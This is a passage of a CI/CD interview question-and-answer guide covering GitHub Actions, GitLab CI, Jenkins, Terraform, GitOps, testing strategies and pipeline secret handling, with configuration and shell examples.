- **Shell**: runs commands directly on the runner's machine
- **Docker**: runs each job in a new container from the job's `image`
- **Kubernetes**: runs each job as a pod in a cluster
- **Docker Autoscaler / Instance**: creates cloud VMs on demand (replaces the old Docker Machine executor)
- Others like VirtualBox, Parallels, SSH and custom

Docker and Kubernetes are the most common because each job gets a clean environment. Shell is simple but jobs share the machine's state.

## 230: What is the difference between the Jenkins controller and agents?

The **controller** (formerly called master) stores the configuration, schedules jobs, serves the UI and keeps build history. **Agents** run the actual builds.

It's best practice to set the controller's executors to 0 so no builds run on it. Builds on the controller can read Jenkins' own files and credentials, and heavy builds slow down the UI for everyone.

## 231: How are environment variable scopes handled in GitHub Actions?

You can set `env` at three levels, and the most specific one wins:

```yaml
env:
  LOG_LEVEL: info # whole workflow

jobs:
  test:
    runs-on: ubuntu-latest
    env:
      LOG_LEVEL: debug # this job
    steps:
      - run: echo $LOG_LEVEL # debug
      - run: echo $LOG_LEVEL # warn
        env:
          LOG_LEVEL: warn # this step only
```

Values written to `GITHUB_ENV` apply to later steps in the same job. Configuration variables (`vars`) can be set at organization, repository and environment level, and the environment one wins.

## 232: What are some useful predefined variables in GitLab CI?

- `CI_COMMIT_SHA`, `CI_COMMIT_SHORT_SHA`: commit hashes
- `CI_COMMIT_BRANCH`, `CI_COMMIT_TAG`, `CI_COMMIT_REF_SLUG`: branch, tag, and a URL-safe name
- `CI_DEFAULT_BRANCH`: usually `main`
- `CI_PIPELINE_SOURCE`: `push`, `merge_request_event`, `schedule`, `web` and so on
- `CI_MERGE_REQUEST_IID`, `CI_MERGE_REQUEST_TARGET_BRANCH_NAME`
- `CI_REGISTRY`, `CI_REGISTRY_IMAGE`, `CI_REGISTRY_USER`, `CI_REGISTRY_PASSWORD`: for the built-in container registry
- `CI_JOB_TOKEN`: a short-lived token for the API and registry

`CI_COMMIT_REF_SLUG` is handy for preview environment names and image tags.

## 233: What are protected branches and protected variables in GitLab?

A protected branch can only be pushed or merged into by certain roles. A protected variable is only given to pipelines running on protected branches or tags.

Together they stop a developer from creating a random branch, changing `.gitlab-ci.yml` to print the production deploy token, and running it. Mark production secrets as both protected and masked.

## 234: How do you debug a failing pipeline?

1. Read the log of the failed step from the top of the error, not just the last line.
2. Check what changed: the code, the pipeline file, dependencies, the runner image or an external service.
3. Check if it fails on main too, or only on this branch.
4. Reproduce locally with the same commands and, if possible, the same Docker image.
5. Turn on debug logging if the problem is in the CI tool itself.
6. Add temporary `echo`, `ls` or `env` output (careful with secrets).
7. Upload logs, screenshots or reports as artifacts for failed tests.

## 235: How do you turn on debug logging in GitHub Actions?

Re-run the job with "Enable debug logging" checked, or set these as repository secrets or variables:

- `ACTIONS_STEP_DEBUG=true`: extra logs from steps and actions
- `ACTIONS_RUNNER_DEBUG=true`: logs from the runner itself

Inside your own scripts, you can print debug lines with `echo "::debug::message"`, which only show when step debugging is on. GitLab has `CI_DEBUG_TRACE: "true"`, but it prints all variables, including secrets, so use it carefully.

## 236: Why does a build pass locally but fail in CI?

Common reasons:

- Different versions of Node, the package manager or system libraries
- Missing environment variables or secrets in CI
- Files that exist locally but aren't committed (or are in `.gitignore`)
- Case-sensitive file systems on Linux runners (`import "./Button"` vs `button.tsx`)
- Different time zone or locale
- Local `node_modules` not matching the lock file
- Tests that depend on order or leftover data on your machine
- Less CPU and memory on the runner, causing timeouts

Pinning versions and running the same Docker image locally fixes most of these.

## 237: How do you keep the Node.js version the same locally and in CI?

Put the version in a file and read it in both places.

```text
# .nvmrc
22.20.0
```

```yaml
- uses: actions/setup-node@v6
  with:
    node-version-file: .nvmrc
```

Other options: the `engines` field in `package.json` with `engine-strict`, the `packageManager` field with Corepack for pnpm or yarn versions, or tools like Volta, mise or asdf. The same idea applies to Python (`.python-version`), Java and Go.

## 238: How do you check commit messages in CI?

Use commitlint with a config, and run it on the commits in the PR.

```yaml
- uses: actions/checkout@v6
  with:
    fetch-depth: 0
- run: npm ci
- run: npx commitlint --from ${{ github.event.pull_request.base.sha }} --to ${{ github.event.pull_request.head.sha }}
```

If the team squash merges, it's often enough to check the PR title instead, since that becomes the commit message on main.

## 239: What is a merge queue?

A merge queue tests pull requests in order against the latest main before merging them. When you click "merge", the PR joins the queue. The queue creates a temporary branch with main plus the PRs ahead of it plus yours, runs CI on it, and only merges if it passes.

This fixes the problem where two PRs each pass on their own but break main when combined. GitHub has merge queues built in. In workflows, you add the `merge_group` trigger so required checks run for queue entries.

```yaml
on:
  pull_request:
  merge_group:
```

## 240: What are merge trains in GitLab?

Merge trains are GitLab's version of a merge queue. Each merge request added to the train gets a pipeline that tests it combined with all the merge requests ahead of it. If one fails, it is removed and the ones behind it are re-tested without it.

It keeps main green on busy projects where many merge requests are merged every day. You need merged results pipelines turned on to use them.

## 241: How do pipelines work for pull requests from forks?

For security, PRs from forks run with limited access. In GitHub Actions, `pull_request` from a fork gets no secrets and a read-only token, and first-time contributors may need a maintainer to approve the run.

This means steps that need secrets, like deploying a preview or uploading coverage with a token, won't work for fork PRs. Options: skip those steps for forks, use tokenless uploads where the tool supports it, or use a separate `workflow_run` workflow that handles the results with care and never runs the fork's code with secrets.

## 242: How do you use workflow_run in GitHub Actions?

`workflow_run` starts a workflow when another one finishes.

```yaml
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
    branches: [main]

jobs:
  deploy:
    if: github.event.workflow_run.conclusion == 'success'
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying ${{ github.event.workflow_run.head_sha }}"
```

It runs in the context of the default branch with secrets, even when the first workflow came from a fork, so treat any artifacts or data from the first run as untrusted. For simple chains inside one workflow, `needs` is easier.

## 243: How do you trigger a pipeline in another repository?

- **GitHub Actions**: send a `repository_dispatch` event through the API, or call `workflow_dispatch` for a specific workflow. You need a token with access to the other repo, usually from a GitHub App.

```bash
gh workflow run deploy.yml --repo my-org/infra -f image_tag="$GITHUB_SHA"
```

- **GitLab**: use `trigger` to start a pipeline in another project (multi-project pipeline), or the pipeline triggers API.
- **Jenkins**: the `build job: 'other-job'` step.

Common use: an app repo's pipeline triggers a deploy pipeline in an infrastructure or GitOps repo.

## 244: What are parent-child pipelines in GitLab?

A parent pipeline can start child pipelines from other YAML files in the same project with `trigger: include`. Each child runs independently and has its own stages.

```yaml
frontend:
  trigger:
    include: frontend/.gitlab-ci.yml
    strategy: depend
  rules:
    - changes:
        - frontend/**/*
```

They are great for monorepos: each part has its own pipeline file, and it only runs when its files change. `strategy: depend` makes the parent wait for and mirror the child's status. Children can also be generated by a job at runtime (dynamic child pipelines).

## 245: How do you add an approval step in Jenkins?

Use the `input` step. Put it outside of an agent block so it doesn't hold an executor while waiting.

```groovy
stage('Approve production') {
  agent none
  steps {
    timeout(time: 1, unit: 'DAYS') {
      input message: 'Deploy to production?', submitter: 'release-managers'
    }
  }
}
```

The `timeout` stops the pipeline from waiting forever. `submitter` limits who can approve.

## 246: How do you run a Jenkins stage inside a Docker container?

```groovy
pipeline {
  agent none
  stages {
    stage('Test') {
      agent {
        docker {
          image 'node:22'
          args '-v $HOME/.npm:/root/.npm'
        }
      }
      steps {
        sh 'npm ci && npm test'
      }
    }
  }
}
```

This needs the Docker Pipeline plugin and Docker on the agent. You can also build from a Dockerfile in the repo with `agent { dockerfile true }`. On Kubernetes, the Kubernetes plugin with pod templates is more common.

## 247: How do you choose between GitHub Actions, GitLab CI and Jenkins?

- **GitHub Actions**: best if your code is on GitHub. Easy to start, huge marketplace, hosted runners, good integration with PRs.
- **GitLab CI**: best if you use GitLab. Strong built-in features (DAG, parent-child pipelines, environments, registry, security scanning) in one product, can be self-hosted.
- **Jenkins**: when you need full control, have special on-premises needs, or already have a big Jenkins setup. Very flexible but needs more maintenance.

For most new web projects, use the CI tool that comes with your Git host unless there is a clear reason not to.

## 248: How would you migrate a project from Jenkins to GitHub Actions?

1. List what the Jenkins jobs do: triggers, stages, credentials, plugins, agents, notifications.
2. Move build logic into scripts or `npm run` commands if it lives in Groovy.
3. Map concepts: stages to jobs, credentials to secrets or OIDC, agents to runners, shared libraries to reusable workflows or composite actions.
4. Run both systems side by side for a while and compare results.
5. Switch required checks to the new workflows.
6. Turn off the Jenkins jobs and remove their credentials.

GitHub's Actions Importer tool can do a first draft of the conversion, which you then clean up.

## 249: How does CI/CD work for mobile apps?

Mobile CI/CD has extra steps:

- **Builds** need macOS runners for iOS, and Android SDK for Android.
- **Code signing**: certificates and provisioning profiles (iOS) or keystores (Android) are stored as secrets and installed during the build. fastlane `match` is a common way to manage iOS signing.
- **Distribution**: builds go to TestFlight, Firebase App Distribution or Google Play internal testing.
- **Release**: app store review means you can't deploy instantly, and you can't roll back an installed app.

So mobile teams use staged rollouts, feature flags and forced update checks much more than web teams.

## 250: Should slow E2E tests run on every pull request?

It's a trade-off between feedback speed and safety. Common approaches:

- Run a small set of critical E2E tests (login, checkout) on every PR, and the full suite in the merge queue or after merge.
- Shard the full suite so it finishes in a few minutes.
- Run only the E2E tests related to changed areas.
- Run the full suite nightly and against staging after deploy.

If E2E tests are flaky, running them on every PR causes a lot of frustration, so fix flakiness first.

## 251: How do you clean up preview environments?

Delete them when the pull request is closed or merged, and add a safety net for ones that get missed.

```yaml
on:
  pull_request:
    types: [closed]

jobs:
  cleanup:
    runs-on: ubuntu-latest
    steps:
      - run: ./scripts/destroy-preview.sh "pr-${{ github.event.number }}"
```

In GitLab, use `environment:on_stop` with a stop job, and `auto_stop_in: 1 week`. A scheduled job that removes previews older than a few days catches anything left behind. Forgotten preview environments with databases can cost a lot of money.

## 252: How do you handle test data in CI?

- Start every run with an empty database, run migrations, then load seed data with a script.
- Make tests create the data they need, instead of depending on shared fixtures that other tests can change.
- Clean up between tests, for example with transactions that are rolled back, or by truncating tables.
- Use factories (like `@faker-js/faker` with a fixed seed) for realistic but repeatable data.

Never copy real production data into CI. If you need realistic volumes, use generated data or properly anonymized dumps.

## 253: How do you protect pipeline files from unwanted changes?

Pipeline files control what runs with your secrets, so changes to them should be reviewed by the right people.

```text
# .github/CODEOWNERS
/.github/workflows/  @my-org/platform-team
/.gitlab-ci.yml      @my-org/platform-team
Jenkinsfile          @my-org/platform-team
```

With "require review from code owners" turned on, a PR that changes these files needs approval from that team. Also use environment protection so a changed workflow on a branch can't deploy to production or read its secrets.

## 254: How would you set up Renovate for a project?

Add a `renovate.json` and tune how updates are grouped and merged.

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:recommended"],
  "schedule": ["before 6am on monday"],
  "packageRules": [
    {
      "matchUpdateTypes": ["minor", "patch"],
      "matchDepTypes": ["devDependencies"],
      "groupName": "dev dependencies",
      "automerge": true
    },
    {
      "matchPackageNames": ["react", "react-dom"],
      "groupName": "react"
    }
  ]
}
```

Grouping keeps the number of PRs manageable, schedules stop updates from interrupting the day, and auto-merge works only if your CI is trustworthy. Renovate also updates Docker images and GitHub Actions versions.

## 255: What is license compliance scanning?

It checks the licenses of all your dependencies and fails or warns when one isn't allowed by your company's policy. For example, some companies don't allow GPL or AGPL licenses in closed-source products.

Tools include FOSSA, Snyk, GitLab license scanning, GitHub's dependency review action (`deny-licenses`) and `license-checker` for npm. It's usually run on PRs that change dependencies.

## 256: How do you scan container images for vulnerabilities in CI?

Run a scanner on the built image before pushing or deploying it.

```yaml
- uses: aquasecurity/trivy-action@v0.36.0
  with:
    image-ref: ghcr.io/my-org/my-app:${{ github.sha }}
    severity: CRITICAL,HIGH
    ignore-unfixed: true
    exit-code: "1"
```

Trivy, Grype, Docker Scout and the scanners built into registries (ECR, GCR, ACR) are common. `ignore-unfixed` avoids failing on issues you can't fix yet. Also scan images on a schedule, because new CVEs are found in images that are already deployed.

## 257: How do you prevent secrets from being committed?

- **Push protection**: GitHub secret scanning can block pushes that contain known token formats. GitLab has a similar feature.
- **Scanners in CI**: gitleaks or TruffleHog scan the diff or full history on every PR.
- **Pre-commit hooks**: run gitleaks locally before commit.
- **`.gitignore`** for `.env` and key files.

```yaml
- uses: actions/checkout@v6
  with:
    fetch-depth: 0
- uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

If a secret gets in anyway, rotate it right away. Removing it from history doesn't help if someone already copied it.

## 258: How do you set up CodeQL in GitHub Actions?

The easiest way is "default setup" in the repo's security settings, which needs no YAML. For more control, use a workflow:

```yaml
name: CodeQL
on:
  pull_request:
  push:
    branches: [main]
  schedule:
    - cron: "0 4 * * 1"

permissions:
  contents: read
  security-events: write

jobs:
  analyze:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v6
      - uses: github/codeql-action/init@v4
        with:
          languages: javascript-typescript
      - uses: github/codeql-action/analyze@v4
```

Results show up as code scanning alerts and as annotations on PRs.

## 259: What is an SBOM?

A software bill of materials (SBOM) is a list of every component in your software: libraries, versions, licenses and where they come from. Common formats are SPDX and CycloneDX.

Generate it in the pipeline (for example with Syft, Trivy, `docker buildx build --sbom=true` or `npm sbom`) and store it with the release. When a new vulnerability like Log4Shell appears, you can quickly search your SBOMs to see which releases are affected. Some customers and regulations now require them.

## 260: How do you run Terraform in a pipeline?

The common flow:

- **On pull request**: `terraform fmt -check`, `terraform validate`, `terraform plan`, and post the plan as a PR comment so reviewers see what will change.
- **On merge to main**: `terraform apply` for that environment.

```yaml
- uses: hashicorp/setup-terraform@v3
- run: terraform init -input=false
- run: terraform plan -input=false -out=tfplan
- run: terraform apply -input=false tfplan
  if: github.ref == 'refs/heads/main'
```

Use OIDC to get cloud credentials, a remote state backend with locking, and a separate state per environment. Tools like Atlantis, HCP Terraform, Spacelift and env0 add PR workflows, policies and locking on top.

## 261: How should Terraform state be handled in CI?

- Store state remotely (S3, Azure Storage, GCS, HCP Terraform), never in the repo or on a runner.
- Use state locking so two pipelines can't apply at the same time. The S3 backend supports native locking with `use_lockfile = true` (the old DynamoDB table approach is deprecated).
- Encrypt state at rest and limit who can read it, since it can contain secrets.
- Split state by environment and by area so a mistake has a small blast radius.

```hcl
terraform {
  backend "s3" {
    bucket       = "my-tf-state"
    key          = "prod/network.tfstate"
    region       = "eu-west-1"
    use_lockfile = true
    encrypt      = true
  }
}
```

## 262: What is infrastructure drift and how do you detect it?

Drift is when the real infrastructure no longer matches the code, usually because someone changed something by hand in the console.

Detect it with a scheduled pipeline that runs `terraform plan -detailed-exitcode`. Exit code `2` means there are changes, so the job can alert the team.

```bash
terraform plan -detailed-exitcode -input=false || code=$?
if [ "${code:-0}" -eq 2 ]; then echo "Drift found"; exit 1; fi
```

GitOps tools like Argo CD detect drift in Kubernetes continuously and can fix it automatically. The real fix is limiting manual access to production.

## 263: How is Ansible used in CI/CD?

Ansible is a configuration management tool. It connects to servers over SSH and runs playbooks that install packages, write config files and restart services. In a pipeline, a deploy job runs a playbook against the target servers.

```yaml
- run: ansible-playbook -i inventories/production deploy.yml --extra-vars "version=$GITHUB_SHA"
```

It's common for VM-based setups. You can check playbooks in CI with `ansible-lint` and test them with Molecule. For containers and Kubernetes, Ansible is used less.

## 264: What does a full GitOps flow with Argo CD look like?

1. Developer merges a PR into the app repo.
2. CI runs tests, builds the image and pushes `my-app:3f2a1c9`.
3. CI updates the image tag in the GitOps (config) repo, either directly or by opening a PR.
4. Argo CD sees the change in the config repo and syncs the cluster.
5. Kubernetes rolls out the new pods. Argo CD shows the app as Synced and Healthy.

To roll back, revert the commit in the config repo. The CI pipeline never needs cluster credentials, only write access to the config repo.

## 265: What is the difference between push-based and pull-based deployment?

- **Push-based**: the CI pipeline connects to the target (server, cluster) and applies changes. Simple, but CI needs production credentials, and nothing fixes manual changes later.
- **Pull-based**: an agent inside the target (like Argo CD or Flux) pulls the desired state from Git and applies it. No outside system needs credentials to the cluster, and the agent keeps fixing drift.

Pull-based is the core idea of GitOps. Push-based is still common and fine for many teams, especially outside Kubernetes.

## 266: How do you update the image tag in a GitOps repo from CI?

Options:

- **Commit directly** to the config repo from CI with a bot token, for example using `kustomize edit set image` or `yq` to change the tag.
- **Open a PR** to the config repo, so production changes are reviewed.
- **Image updater tools**: Argo CD Image Updater or Flux's image automation watch the registry and update the tag themselves.

```bash
cd overlays/staging
kustomize edit set image my-app=ghcr.io/my-org/my-app:"$GITHUB_SHA"
git commit -am "staging: my-app $GITHUB_SHA"
git push
```

## 267: What should you check after a deployment?

- Smoke tests: health endpoint, main pages, login
- Error rate and latency in monitoring, compared to before the deploy
- Logs for new error types
- Key business metrics, like orders or sign-ups, not dropping
- The deployed version (for example a `/version` endpoint) is the one you expected

Automating these checks and connecting them to automatic rollback is better than relying on someone watching dashboards.

## 268: What is synthetic monitoring?

Synthetic monitoring runs scripted checks against production on a schedule, like "every 5 minutes, open the site, log in with a test account and add an item to the cart". If a check fails, it alerts the team.

It catches problems even when there is little real traffic, such as at night. Many teams reuse a few Playwright tests for this. Tools include Checkly, Datadog Synthetics, Grafana Synthetic Monitoring and New Relic.

## 269: How do you connect deployments to monitoring?

Send a deployment event to your monitoring tool from the pipeline, so a vertical line appears on graphs at the time of the deploy. When error rates jump, you can see right away if it lines up with a deployment.

```bash
curl -X POST "https://grafana.example.com/api/annotations" \
  -H "Authorization: Bearer $GRAFANA_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"tags\":[\"deploy\",\"api\"],\"text\":\"api $GITHUB_SHA deployed\"}"
```

Datadog, Sentry (releases), New Relic and Honeycomb have similar features. Also tag logs and traces with the version.

## 270: How does change management work with CI/CD?

In many companies, changes to production need an approval record. With CI/CD this can be automated:

- The PR review and passing checks are the approval for normal changes.
- The pipeline creates a change record (for example in ServiceNow or Jira) with the commit, tests and approver.
- High-risk changes need an extra manual approval through a protected environment.

The goal is to keep the control and the audit trail without a weekly meeting that delays every release.

## 271: How do you keep an audit trail of deployments?

- Every deployment is done by the pipeline, not by people running commands by hand.
- The CI tool records who triggered it, which commit, which approvals, and the logs.
- Environments in GitHub and GitLab keep a deployment history.
- In GitOps, the Git history of the config repo is the deploy log.
- Cloud audit logs (like AWS CloudTrail) record what the deploy role did.

You should be able to answer "what was running in production at 14:00 last Tuesday, and who approved it?"

## 272: How do you use Docker Compose for integration tests in CI?

Start the app's dependencies with Compose, wait for them, run tests, and always tear down.

```yaml
- run: docker compose -f compose.test.yml up -d --wait
- run: npm run test:integration
- if: always()
  run: docker compose -f compose.test.yml logs
- if: always()
  run: docker compose -f compose.test.yml down -v
```

`--wait` waits until services with health checks are healthy. This works on any runner with Docker and matches the setup developers use locally.

## 273: What is Testcontainers?

Testcontainers is a library (for Java, Node.js, Go, .NET, Python and more) that starts real services like Postgres, Redis or Kafka in Docker from inside your test code, and removes them after.

```ts
import { PostgreSqlContainer } from "@testcontainers/postgresql";

const container = await new PostgreSqlContainer("postgres:17").start();
process.env.DATABASE_URL = container.getConnectionUri();
// run tests...
await container.stop();
```

Each test suite gets a fresh, real database instead of a mock. In CI, the runner needs Docker. It works on GitHub-hosted Linux runners out of the box.

## 274: What is contract testing?

Contract testing checks that a service and its consumers agree on the API, without running both together. The consumer writes tests that describe the requests it sends and the responses it expects. That becomes a contract. The provider's pipeline then checks that it really meets every contract.

Pact is the most common tool, with a Pact Broker to store contracts. In a microservice setup, it catches breaking API changes in the provider's pipeline before deployment, which is much faster than full E2E tests across many services.

## 275: How do you run performance tests in a pipeline?

Use a load testing tool like k6, Gatling, JMeter or Artillery against a staging or dedicated environment, and fail if results are over a threshold.

```js
// load-test.js
import http from "k6/http";

export const options = {
  vus: 50,
  duration: "2m",
  thresholds: {
    http_req_duration: ["p(95)<300"],
    http_req_failed: ["rate<0.01"],
  },
};

export default function () {
  http.get("https://staging.example.com/api/products");
}
```

k6 exits with an error if a threshold fails, so the pipeline fails too. Full load tests are often too slow for every PR, so they run nightly or before releases.

## 276: What are visual regression tests?

Visual tests take screenshots of pages or components and compare them with approved baseline images. If pixels change beyond a small threshold, the test fails and shows a diff.

Playwright has `expect(page).toHaveScreenshot()` built in. Chromatic (for Storybook), Percy and Applitools are hosted options with review UIs. Screenshots depend on fonts and OS, so generate baselines in the same Docker image the CI uses.

## 277: How do you test accessibility in CI?

Run automated checks with axe-core on your pages or components:

```ts
import { test, expect } from "@playwright/test";
import AxeBuilder from "@axe-core/playwright";

test("home page has no a11y violations", async ({ page }) => {
  await page.goto("/");
  const results = await new AxeBuilder({ page }).analyze();
  expect(results.violations).toEqual([]);
});
```

Other options: `jest-axe`, Storybook's a11y addon, Pa11y and Lighthouse. Automated tools find only part of the problems (missing labels, contrast, roles), so manual testing with a keyboard and screen reader is still needed.

## 278: What is Lighthouse CI?

Lighthouse CI runs Google Lighthouse in the pipeline against your built site or a preview URL, and checks scores and metrics against budgets you set: performance, accessibility, best practices and SEO.

```json
{
  "ci": {
    "collect": { "staticDistDir": "./dist", "numberOfRuns": 3 },
    "assert": {
      "assertions": {
        "categories:performance": ["error", { "minScore": 0.9 }],
        "largest-contentful-paint": ["warn", { "maxNumericValue": 2500 }]
      }
    }
  }
}
```

Running several times and using the median reduces noise. Lab results on CI runners vary, so set budgets with some margin.

## 279: How do you stop JavaScript bundle size from growing?

Add a size check to CI that fails or comments when bundles grow past a limit.

- `size-limit` with a config of limits per entry
- `bundlesize` or bundler plugins that report sizes
- Tools that comment the size diff on the PR (like the `size-limit` GitHub action, or Codecov bundle analysis)

```json
[{ "path": "dist/assets/index-*.js", "limit": "180 KB" }]
```

Seeing "+40 KB" on a PR makes people think twice about adding a big library.

## 280: What is an artifact repository like Nexus or Artifactory?

It's a server that stores build outputs and dependencies in one place: npm packages, Maven JARs, Docker images, Python wheels and generic files. JFrog Artifactory and Sonatype Nexus are the most common.

They are used to:

- Keep release artifacts permanently, outside the CI system
- Act as a proxy and cache for public registries, so builds are faster and still work if npm or Docker Hub is down
- Control which packages are allowed

## 281: How do you clean up old images and artifacts?

Set lifecycle or retention policies, so storage doesn't grow forever:

- ECR lifecycle policies: for example keep the last 50 tagged images and delete untagged images after 7 days.
- GHCR and GitLab registry cleanup policies.
- CI artifact retention days.
- Keep anything that is a release or currently deployed, and never delete images that a running environment or rollback might need.

Tag release images clearly (for example `v1.4.2`) so cleanup rules can keep them.

## 282: How do you keep CI costs under control?

- Cancel outdated runs with concurrency settings.
- Don't run everything on docs-only changes (path filters).
- Use caching and affected-only builds in monorepos.
- Use Linux runners where possible. macOS and Windows minutes cost much more.
- Set timeouts so stuck jobs don't burn minutes.
- Use larger runners only where they save more time than they cost.
- Self-hosted or spot instances for high volumes.
- Delete old artifacts and caches.

Look at the billing or usage report to find which workflows cost the most.

## 283: What is the problem with path filters and required status checks?

If a workflow is a required check but it doesn't run because of `paths` filters, the check never reports, and GitHub shows the PR as waiting forever ("Expected — Waiting for status to be reported").

Common fixes:

- Don't use workflow-level `paths` for required checks. Run the workflow always, and decide inside it (for example with a "changes" job) which jobs to run. Skipped jobs count as passed.
- Have one final "all checks" job that is the only required check, and that passes when the needed jobs passed or were skipped.

## 284: How do you run a whole GitHub Actions job inside a container?

Use the `container` key. All `run` steps then execute inside that image.

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    container:
      image: node:22-bookworm
    services:
      redis:
        image: redis:8
    steps:
      - uses: actions/checkout@v6
      - run: npm ci && npm test
        env:
          REDIS_URL: redis://redis:6379
```

When the job runs in a container, services are reached by their name (`redis`) instead of `localhost`. This gives you full control over the tools in the environment.

## 285: How do you lint pipeline files?

- **GitHub Actions**: `actionlint` checks syntax, expressions, `needs` references and runs shellcheck on `run` scripts. `zizmor` looks for security problems in workflows.
- **GitLab**: the pipeline editor and the CI Lint tool validate `.gitlab-ci.yml`, including includes.
- **Jenkins**: the declarative linter (`jenkins-cli declarative-linter` or the REST endpoint).
- **General**: YAML schemas in the editor (VS Code with the GitHub Actions or YAML extensions).

Running a linter on PRs that change pipeline files catches most mistakes before they break main.

## 286: How do you test changes to a pipeline safely?

- Make the change on a branch. Most tools run the pipeline from the branch's version of the file.
- Use `workflow_dispatch` to run a workflow on your branch manually.
- For deploy changes, point at a test environment or add a dry-run option first.
- Lint the file before pushing.
- For shared templates and reusable workflows, release new versions with tags and update repos one by one, instead of changing what everyone uses at once.

In GitHub, `pull_request` workflows use the PR's version of the file, but `pull_request_target` and `workflow_run` use the default branch version, so those can't be tested on a branch.

## 287: How do you use a secret manager like Vault in a pipeline?

Instead of storing secrets in the CI tool, the job authenticates to the secret manager and fetches what it needs at run time. OIDC makes this possible without any stored secret.

```yaml
permissions:
  id-token: write
steps:
  - uses: hashicorp/vault-action@v3
    with:
      url: https://vault.example.com
      method: jwt
      role: ci-deploy
      secrets: |
        secret/data/prod/db password | DB_PASSWORD
```

AWS Secrets Manager, Azure Key Vault and Google Secret Manager work the same way with the cloud's OIDC login. Secrets stay in one place, can be rotated without touching CI, and access is logged.

## 288: What should you watch out for with environment variables in frontend builds?

Frontend build tools insert some env variables into the JavaScript bundle at build time, for example `VITE_*` in Vite or `NEXT_PUBLIC_*` in Next.js. Anything in the bundle can be read by anyone who opens the site.

So never put secrets in these variables. Only public values like an API base URL or a public analytics ID belong there. Also, because they are baked in at build time, you need a different build per environment, unless you load config at runtime.

## 289: What are common caching problems in CI?

- **Wrong key**: the key doesn't include the lock file hash, so old dependencies are restored.
- **OS or architecture mix**: restoring a Linux `node_modules` with native modules on macOS or ARM. Include `runner.os` and `runner.arch` in the key.
- **Caching too much**: huge caches take longer to download than to rebuild.
- **Size limits**: GitHub Actions has a default cache limit of 10 GB per repository and evicts old entries.
- **Branch scope**: caches from other branches may not be visible. In GitHub Actions, a branch can read caches from its own branch and the default branch.
- **Poisoning**: untrusted jobs writing to caches that trusted jobs use.

## 290: Why does fetch-depth matter for some tools?

`actions/checkout` fetches only the last commit by default. Some tools need more Git history:

- `git describe` and version tools need tags.
- `nx affected` and `turbo --filter=[origin/main]` need the base commit.
- Changelog tools and commitlint need the commits in the PR.
- SonarQube uses blame info for new code detection.

```yaml
- uses: actions/checkout@v6
  with:
    fetch-depth: 0 # full history
    fetch-tags: true
```

Full history can be slow for big repos, so fetch only what you need when you can.

## 291: How do you install private npm packages in CI?

Point npm at the registry and give it a token through an environment variable, not a committed token.

```text
# .npmrc (committed)
@my-org:registry=https://npm.pkg.github.com
//npm.pkg.github.com/:_authToken=${NODE_AUTH_TOKEN}
```

```yaml
- uses: actions/setup-node@v6
  with:
    node-version: 22
    registry-url: https://npm.pkg.github.com
    scope: "@my-org"
- run: npm ci
  env:
    NODE_AUTH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

For packages in other repos, the token needs read access to those packages, which you can grant in the package settings.

## 292: How do you check out a private submodule or a second repo in CI?

The default token only has access to the current repo. For other private repos, use a deploy key or a GitHub App token.

```yaml
- uses: actions/create-github-app-token@v2
  id: app-token
  with:
    app-id: ${{ vars.APP_ID }}
    private-key: ${{ secrets.APP_PRIVATE_KEY }}
    owner: my-org
- uses: actions/checkout@v6
  with:
    submodules: recursive
    token: ${{ steps.app-token.outputs.token }}
```

GitHub App tokens are short-lived and scoped to the repos you allow, which is better than a personal access token.

## 293: How do you know which version is running in an environment?

Put version info into the build and expose it:

```bash
docker build \
  --build-arg GIT_SHA="$GITHUB_SHA" \
  --label org.opencontainers.image.revision="$GITHUB_SHA" \
  -t my-app:"$GITHUB_SHA" .
```

Then the app can serve it on a `/version` or `/health` endpoint, show it in the footer of an admin page, and include it in logs and error reports. The deployment tools (GitHub environments, Argo CD, Helm history) also show it, but having it in the app itself is the most reliable answer.

## 294: How would you set up a tag-based release workflow?

```yaml
on:
  push:
    tags: ["v*.*.*"]

jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      image: ${{ steps.meta.outputs.image }}
    steps:
      - uses: actions/checkout@v6
      - id: meta
        run: echo "image=ghcr.io/my-org/app:${GITHUB_REF_NAME}" >> "$GITHUB_OUTPUT"
      - run: echo "build and push ${{ steps.meta.outputs.image }}"

  deploy-staging:
    needs: build
    environment: staging
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploy ${{ needs.build.outputs.image }} to staging"

  deploy-production:
    needs: deploy-staging
    environment: production
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploy ${{ needs.build.outputs.image }} to production"
```

The `production` environment has required reviewers and only allows `v*` tags, so the same image goes to staging first and then waits for approval.

## 295: How do you deploy several services that depend on each other?

- Make services backward compatible, so the deploy order matters as little as possible.
- If order matters, deploy the provider before the consumer (for example the API with a new field before the frontend that uses it).
- Use `needs` or stages to set the order in one pipeline, or sync waves in Argo CD.
- Run a smoke test after each step before going on.

Needing to deploy many services together at the same moment is a sign of tight coupling, sometimes called a "distributed monolith".

## 296: What can go wrong with scheduled workflows?

- They fail and nobody notices, because no one is watching. Send notifications for scheduled failures.
- In GitHub Actions, scheduled workflows in public repos are turned off automatically after 60 days without activity in the repo.
- Schedules can start late during busy times, especially at the top of the hour. Use odd minutes like `17 3 * * *`.
- They run on the default branch only, so changes on other branches don't affect them.
- Time zone confusion (GitHub uses UTC).

## 297: What should you know about Windows and macOS runners?

- They cost more per minute than Linux on hosted CI (macOS a lot more).
- They are slower to start, and some features (like service containers in GitHub Actions) only work on Linux.
- Scripts need to work on them: use `shell: bash` (Git Bash is installed on Windows runners) or write cross-platform scripts in Node.
- Watch out for path separators, line endings (`core.autocrlf`) and case-insensitive file systems.

Use them only for jobs that really need them, like testing a desktop app or building for iOS.

## 298: How do you make errors easy to find in GitHub Actions logs?

Use workflow commands to create annotations and groups.

```bash
echo "::group::Install dependencies"
npm ci
echo "::endgroup::"

echo "::error file=src/app.ts,line=10::Something is wrong here"
echo "::warning::Deprecated config option used"
```

Errors and warnings show up on the run summary and on the PR's changed files. Many tools (ESLint formatters, test reporters, `setup-node` problem matchers) create annotations for you. A short Markdown summary in `GITHUB_STEP_SUMMARY` also helps.

